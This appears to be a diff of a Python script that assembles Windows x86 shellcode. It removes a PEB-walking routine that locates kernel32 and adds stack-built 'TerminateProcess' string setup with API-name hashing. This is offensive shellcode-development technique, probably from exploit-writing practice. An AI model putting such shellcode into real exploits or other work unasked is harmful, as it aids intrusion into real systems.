@@ -31,17 +31,13 @@ start:
     mov ebp, esp
     sub sp, 0x60
 
-find_kernel32:
-    xor ecx, ecx
-    mov esi, fs:[ecx+0x30]  # _TEB.ProcessEnvironmentBlock
-    mov esi, [esi+0x0c]     # _PEB.Ldr
-    mov esi, [esi+0x1c]     # _PEB_LDR_DATA.InInitializationOrderModuleList
-check_module:
-    mov ebx, [esi+0x08]     # _LDR_DATA_TABLE_ENTRY.DllBase
-    mov edi, [esi+0x20]     # _LDR_DATA_TABLE_ENTRY.DllName
-    mov esi, [esi]
-    cmp [edi+0x18], cx
-    jne check_module
+    xor eax, eax
+    push eax
+    push 0x73736563  # "cess"
+    push 0x6f725065  # "ePro"
+    push 0x74616e69  # "inat"
+    push 0x6d726554  # "Term"
+    mov esi, esp     # "TerminateProcess"
 
 compute_hash:
     xor eax, eax
@@ -57,6 +53,6 @@ compute_hash_again:
 compute_hash_finished:
 ''')
 
-print(f'{disasm(shellcode)}')
+print(f'compute_hash(b\'TerminateProcess\') = {compute_hash(b"TerminateProcess")}')
 print(f'shellcode = {shellcode}')
 
